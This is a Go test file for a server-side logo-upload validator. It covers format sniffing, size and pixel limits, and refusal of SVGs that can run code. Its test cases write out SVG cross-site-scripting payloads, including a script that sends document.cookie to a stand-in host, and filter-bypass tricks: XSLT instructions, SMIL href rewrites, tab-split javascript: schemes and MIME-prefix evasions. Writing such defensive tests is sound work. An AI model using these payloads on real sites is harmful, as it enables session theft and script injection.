package main

import (
	"bytes"
	"encoding/base64"
	"image"
	"image/color"
	"image/jpeg"
	"image/png"
	"net/http"
	"strings"
	"testing"
)

// What may become a campaign's logo, and — mostly — what may not.
//
// The bytes end up on an origin of their own, and the interface only ever
// renders them in an <img>. This is the layer that decides what is stored at
// all, so its cases are the refusals: a file lying about its own format, and
// the four shapes that make an SVG something other than a drawing.

// rasterPNG: a uniform image, which compresses to well under the ceiling
// whatever its dimensions. Built rather than embedded so the width and
// height a case needs are the ones it asks for.
func rasterPNG(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for x := range w {
		for y := range h {
			img.Set(x, y, color.RGBA{R: 20, G: 18, B: 16, A: 255})
		}
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func rasterJPEG(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, nil); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func dataURI(mime string, raw []byte) string {
	return "data:" + mime + ";base64," + base64.StdEncoding.EncodeToString(raw)
}

func TestAValidLogoIsAcceptedAndKeyedByItsContent(t *testing.T) {
	raw := rasterPNG(t, 120, 40)
	logo, code, why := readLogo("camille2027", dataURI("image/png", raw))
	if logo == nil {
		t.Fatalf("a 120×40 PNG was refused: %d %s", code, why)
	}
	if logo.ContentType != "image/png" {
		t.Errorf("content type = %q, want image/png", logo.ContentType)
	}
	if !strings.HasPrefix(logo.Key, "logos/camille2027/") ||
		!strings.HasSuffix(logo.Key, ".png") {
		t.Errorf("key = %q: expected logos/<slug>/<digest>.png", logo.Key)
	}
	// A key is NEVER produced twice, not even by the same bytes. That is
	// what lets a deletion be unconditional: no upload can write back the
	// key another one is about to remove, so nothing has to hold a lock —
	// or a database connection — across a call to the store. The cost is
	// two objects where there used to be one, and the first is deleted as
	// the pointer moves.
	again, _, _ := readLogo("camille2027", dataURI("image/png", raw))
	if again == nil || again.Key == logo.Key {
		t.Errorf("the same image produced the same key twice (%q): a key "+
			"that can come back is a key a deletion can destroy in use",
			logo.Key)
	}
	// And it still carries the digest of the content, which is what makes a
	// bucket restored from an older copy detectable, and the URL cacheable.
	digest, _, _ := strings.Cut(strings.TrimPrefix(logo.Key,
		"logos/camille2027/"), "-")
	if len(digest) != 16 {
		t.Errorf("key %q does not open on a 16-character digest", logo.Key)
	}
	if again != nil && !strings.Contains(again.Key, digest) {
		t.Errorf("the same bytes gave two digests: %q then %q",
			logo.Key, again.Key)
	}
	other, _, _ := readLogo("camille2027", dataURI("image/png",
		rasterPNG(t, 121, 40)))
	if other != nil && strings.Contains(other.Key, digest) {
		t.Errorf("two different images share the digest in %q", other.Key)
	}
}

// The declared type is a claim; the bytes are the fact. Stored under the
// wrong Content-Type, an image simply does not render, and the campaign has
// no way to know why.
func TestTheBytesDecideTheFormat(t *testing.T) {
	logo, code, why := readLogo("c", dataURI("image/png", rasterJPEG(t, 40, 40)))
	if logo != nil {
		t.Fatal("JPEG bytes were accepted as a PNG")
	}
	if code != http.StatusBadRequest {
		t.Errorf("code = %d, want 400", code)
	}
	if !strings.Contains(why, "JPEG") {
		t.Errorf("the refusal does not say what the file actually is: %q", why)
	}
}

func TestALogoIsBoundedInBytesAndInPixels(t *testing.T) {
	// Too heavy: refused on size, before anything tries to read it as an
	// image — which is what keeps a malformed 10 MB upload cheap.
	heavy := bytes.Repeat([]byte{0x89}, maxLogoBytes+1)
	if logo, code, _ := readLogo("c", dataURI("image/png", heavy)); logo != nil ||
		code != http.StatusRequestEntityTooLarge {
		t.Errorf("a %d-byte upload answered %d, want 413", len(heavy), code)
	}
	// Too wide: a uniform 2500×10 PNG weighs almost nothing, so only the
	// pixel ceiling stands between it and every browser that decodes it.
	wide := rasterPNG(t, maxLogoPixels+500, 10)
	if len(wide) > maxLogoBytes {
		t.Fatalf("the fixture weighs %d bytes: this case would pass on size "+
			"and prove nothing about pixels", len(wide))
	}
	logo, code, why := readLogo("c", dataURI("image/png", wide))
	if logo != nil {
		t.Fatal("a 2500-pixel-wide image was accepted")
	}
	if code != http.StatusBadRequest || !strings.Contains(why, "pixels") {
		t.Errorf("code %d, message %q: expected a refusal naming the pixels",
			code, why)
	}
}

func TestOnlyTheFourFormatsAreAccepted(t *testing.T) {
	for _, mime := range []string{"image/gif", "text/html", "application/pdf",
		"image/svg", ""} {
		logo, code, _ := readLogo("c", dataURI(mime, []byte("whatever")))
		if logo != nil {
			t.Errorf("%q was accepted", mime)
			continue
		}
		if code != http.StatusUnsupportedMediaType {
			t.Errorf("%q answered %d, want 415", mime, code)
		}
	}
	// Not a data URI at all. A plain URL above all: fetching one would make
	// the server issue a request to an address the caller chose.
	for _, body := range []string{
		"https://exemple.fr/logo.png", "logo.png", "", "data:image/png,abc",
		"data:image/png;base64,!!!not base64!!!",
	} {
		if logo, _, _ := readLogo("c", body); logo != nil {
			t.Errorf("%q was accepted as an image", body)
		}
	}
}

const cleanSVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 29">` +
	`<path d="M13 1 24.3 7.5v13L13 27 1.7 20.5v-13z" fill="#ffd400"/></svg>`

func TestACleanSVGIsAccepted(t *testing.T) {
	logo, code, why := readLogo("c", dataURI("image/svg+xml", []byte(cleanSVG)))
	if logo == nil {
		t.Fatalf("a plain drawing was refused: %d %s", code, why)
	}
	if !strings.HasSuffix(logo.Key, ".svg") {
		t.Errorf("key = %q, expected a .svg suffix", logo.Key)
	}
}

// Each of these is a document that does something. They are refused at
// upload, and the two layers behind — an <img> renders SVG in secure static
// mode, and the media origin holds no cookie — exist because a validator is
// never the whole answer.
func TestAnSVGThatCanRunSomethingIsRefused(t *testing.T) {
	cases := map[string]string{
		"a script element": `<svg xmlns="http://www.w3.org/2000/svg">` +
			`<script>fetch("https://ailleurs.example/"+document.cookie)</script></svg>`,
		"an event handler": `<svg xmlns="http://www.w3.org/2000/svg" ` +
			`onload="alert(1)"><rect width="10" height="10"/></svg>`,
		"an event handler on a child": `<svg xmlns="http://www.w3.org/2000/svg">` +
			`<rect width="10" height="10" onclick="alert(1)"/></svg>`,
		"embedded HTML": `<svg xmlns="http://www.w3.org/2000/svg">` +
			`<foreignObject><body xmlns="http://www.w3.org/1999/xhtml">` +
			`<iframe src="https://ailleurs.example/"></iframe></body></foreignObject></svg>`,
		"a DOCTYPE, hence entity declarations": `<?xml version="1.0"?>` +
			`<!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;">]>` +
			`<svg xmlns="http://www.w3.org/2000/svg"><text>&b;</text></svg>`,
		"an external reference": `<svg xmlns="http://www.w3.org/2000/svg">` +
			`<image href="https://ailleurs.example/pixel.png"/></svg>`,
		"a javascript: link": `<svg xmlns="http://www.w3.org/2000/svg">` +
			`<a href="javascript:alert(1)"><rect width="10" height="10"/></a></svg>`,
		"not an SVG at all": `<html><body>bonjour</body></html>`,
		"not even XML":      `<svg xmlns="http://www.w3.org/2000/svg"`,

		// A processing instruction is not decoration. Opened at its own
		// address, the browser fetched this XSLT and applied it, and the
		// document it produced ran its <script> on the media origin —
		// verified in Chromium, `document.contentType` was `text/html`.
		// The token switch handled StartElement and Directive and let
		// every ProcInst through.
		"an XSLT stylesheet instruction": `<?xml-stylesheet type="text/xsl" ` +
			`href="data:text/xsl;base64,PHhzbDpzdHlsZXNoZWV0Lz4="?>` +
			`<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>`,

		// SMIL rewrites an attribute AFTER the document loads, so the value
		// the validator read is not the value the browser follows. And a
		// browser strips tabs and newlines out of a URL before reading its
		// scheme, so `java<TAB>script:` is javascript: to it and to no
		// string comparison.
		"an animate rewriting href": "<svg xmlns=\"http://www.w3.org/2000/svg\"><a>" +
			"<animate attributeName=\"href\" to=\"java\tscript:alert(1)\" begin=\"0s\"/>" +
			"<rect width=\"10\" height=\"10\"/></a></svg>",
		"a set rewriting href": "<svg xmlns=\"http://www.w3.org/2000/svg\"><a>" +
			"<set attributeName=\"href\" to=\"java\nscript:alert(1)\"/>" +
			"<rect width=\"10\" height=\"10\"/></a></svg>",
		// Caught by the ELEMENT refusal and by nothing else: the target is
		// a perfectly ordinary https URL, so no scheme check fires, and the
		// external-reference check only reads attributes named `href` —
		// here the URL lives in `to`.
		"an animate pointing a link somewhere else": `<svg xmlns="http://www.w3.org/2000/svg"><a>` +
			`<animate attributeName="href" to="https://ailleurs.example/" begin="0s"/>` +
			`<rect width="10" height="10"/></a></svg>`,
		"a link whose scheme carries a tab": "<svg xmlns=\"http://www.w3.org/2000/svg\">" +
			"<a href=\"java\tscript:alert(1)\"><rect width=\"10\" height=\"10\"/></a></svg>",
		// The payloads below are percent-encoded, and that is not cosmetic:
		// a raw `<` inside an attribute value is a SYNTAX error, so the
		// version of this case that spelled `<script>` in clear was refused
		// as unreadable XML and proved nothing about the rule it names. The
		// mutation stayed green and said so.
		"an HTML data: link": `<svg xmlns="http://www.w3.org/2000/svg">` +
			`<a href="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">` +
			`<rect width="10" height="10"/></a></svg>`,

		// The inline-raster allowance is a MIME token, not a prefix. Read as
		// a prefix, these three walk through it: the first because the noise
		// strip deletes the space before the check reads the value, the
		// second because nothing said the token ends, and the third because
		// an SVG is an image — and an image this validator never opened.
		"an HTML data: link wearing an image MIME": `<svg xmlns="http://www.w3.org/2000/svg">` +
			`<a href="data:image /html,%3Cscript%3Ealert(1)%3C/script%3E">` +
			`<rect width="10" height="10"/></a></svg>`,
		"an image MIME with something after it": `<svg xmlns="http://www.w3.org/2000/svg">` +
			`<a href="data:image/x/html,%3Cscript%3Ealert(1)%3C/script%3E">` +
			`<rect width="10" height="10"/></a></svg>`,
		"an inline SVG carrying a script": `<svg xmlns="http://www.w3.org/2000/svg">` +
			`<a href="data:image/svg+xml,%3Csvg%20xmlns=&apos;http://www.w3.org/2000/svg&apos;` +
			`%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E">` +
			`<rect width="10" height="10"/></a></svg>`,
		// Deprecated, and parsed as `animate` by the engines that kept it.
		"an animateColor rewriting href": `<svg xmlns="http://www.w3.org/2000/svg"><a>` +
			`<animateColor attributeName="href" to="https://ailleurs.example/"/>` +
			`<rect width="10" height="10"/></a></svg>`,
	}
	for name, body := range cases {
		logo, code, why := readLogo("c", dataURI("image/svg+xml", []byte(body)))
		if logo != nil {
			t.Errorf("%s: accepted", name)
			continue
		}
		if code != http.StatusBadRequest {
			t.Errorf("%s: answered %d, want 400", name, code)
		}
		if why == "" {
			t.Errorf("%s: refused without saying why", name)
		}
	}
}

// What every drawing tool writes on its first line. Refusing the whole
// class of processing instructions refused the XML declaration with it, so
// nearly nothing a campaign exports could be uploaded — and the sentence
// asked them to remove a line their editor does not show them.
func TestTheXMLDeclarationEveryEditorWritesIsAccepted(t *testing.T) {
	for name, head := range map[string]string{
		"the plain declaration":   `<?xml version="1.0"?>`,
		"with an encoding":        `<?xml version="1.0" encoding="UTF-8"?>`,
		"standalone, as Inkscape": `<?xml version="1.0" encoding="UTF-8" standalone="no"?>`,
		"spelled in another case": `<?XML version="1.0"?>`,
		"followed by a comment":   `<?xml version="1.0"?><!-- Generator: Illustrator -->`,
	} {
		svg := head + `<svg xmlns="http://www.w3.org/2000/svg" width="10" ` +
			`height="10"><rect width="10" height="10"/></svg>`
		logo, code, why := readLogo("c", dataURI("image/svg+xml", []byte(svg)))
		if logo == nil {
			t.Errorf("%s: refused (%d) — %s", name, code, why)
		}
	}
}

// The scheme check reads a URL, and prose is not one. An attribute that
// spells the word in a sentence is a legend; a value that STARTS with it is
// a link.
func TestAnAttributeMaySpellJavascriptInProse(t *testing.T) {
	svg := `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">` +
		`<rect width="10" height="10" data-note="voir javascript: plus bas"/>` +
		`<title>JavaScript: the logo</title></svg>`
	if logo, code, why := readLogo("c", dataURI("image/svg+xml", []byte(svg))); logo == nil {
		t.Errorf("an attribute mentioning the word was refused (%d): %s", code, why)
	}
	hostile := `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">` +
		`<rect width="10" height="10" fill="javascript:alert(1)"/></svg>`
	if logo, _, _ := readLogo("c", dataURI("image/svg+xml", []byte(hostile))); logo != nil {
		t.Error("a value BEGINNING with the scheme was accepted")
	}
}

// An INLINE raster is not an external reference — it is the most autonomous
// form there is, and "Embed image" in Inkscape, Figma and Illustrator all
// produce one. Refusing it contradicted the very sentence the refusal
// printed, and rejected a common real export.
func TestAnSVGEmbeddingItsOwnRasterIsAccepted(t *testing.T) {
	svg := `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">` +
		`<image href="data:image/png;base64,` +
		base64.StdEncoding.EncodeToString(rasterPNG(t, 4, 4)) +
		`" width="10" height="10"/></svg>`
	logo, code, why := readLogo("c", dataURI("image/svg+xml", []byte(svg)))
	if logo == nil {
		t.Errorf("an SVG embedding its own raster was refused (%d): %s", code, why)
	}
}

// The refusals are read by whoever is uploading, so they have to say what to
// do next rather than name a rule.
func TestARefusalTellsTheUploaderWhatToDo(t *testing.T) {
	_, _, why := readLogo("c", dataURI("image/gif", []byte("GIF89a")))
	for _, expected := range []string{"PNG", "JPEG", "WebP", "SVG"} {
		if !strings.Contains(why, expected) {
			t.Errorf("the refusal of a GIF does not name %s: %q", expected, why)
		}
	}
}
